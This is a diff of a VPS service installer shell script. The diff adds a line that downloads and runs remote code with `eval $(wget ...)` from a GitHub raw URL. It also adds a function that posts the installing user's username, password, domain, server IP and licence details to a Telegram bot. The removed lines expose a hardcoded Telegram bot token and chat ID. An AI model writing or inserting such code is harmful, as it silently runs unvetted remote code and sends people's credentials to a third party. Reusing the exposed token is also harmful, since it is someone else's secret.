@@ -20,13 +20,11 @@ apt install python -y && apt install python3 -y
 apt install socat
 IPVPS=$(curl -sS ipv4.icanhazip.com)
 export IP=$( curl -sS icanhazip.com )
-
+eval $(wget -qO- "https://raw.githubusercontent.com/script-VIP/Vip/main/Fls/botkey")
+URL="https://api.telegram.org/bot$KEY/sendMessage"
 # GIT REPO
 LUNAREP="https://raw.githubusercontent.com/script-VIP/v69/main/"
 
-# // TELEGRAM NOTIFIKASI
-BOTKEY="7783206606:AAF1EQYzyTqkiE8gY_VqUzkRDHhe1AsjGwk"
-AIDI="6198984094"
 
 echo "BOTKEY" > /etc/lunatic/bot/notif/key
 echo "AIDI" >> /etc/lunatic/bot/notif/id
@@ -385,7 +383,29 @@ DOMENS_SETUP() {
     return 1
   fi
 }
-
+clear
+restart_system() {
+USRSC=$(wget -qO- https://raw.githubusercontent.com/script-VIP/izin/main/ip | grep $ipsaya | awk '{print $2}')
+EXPSC=$(wget -qO- https://raw.githubusercontent.com/script-VIP/izin/main/ip | grep $ipsaya | awk '{print $3}')
+TIMEZONE=$(printf '%(%H:%M:%S)T')
+TEXT="
+<code>────────────────────</code>
+<b> 🟢 NOTIFICATIONS INSTALL 🟢</b>
+<code>────────────────────</code>
+<code>user   : </code><code>$Username</code>
+<code>PW     : </code><code>$Password</code>
+<code>ID     : </code><code>$USRSC</code>
+<code>Domain : </code><code>$domain</code>
+<code>Date   : </code><code>$TIME</code>
+<code>Time   : </code><code>$TIMEZONE</code>
+<code>Ip vps : </code><code>$ipsaya</code>
+<code>Exp Sc : </code><code>$EXPSC</code>
+<code>────────────────────</code>
+<i>Automatic Notification from Github</i>
+"
+curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+}
+clear
 SSL_SETUP() {
     clear
     print_install "Memasang SSL Certificate pada domain"
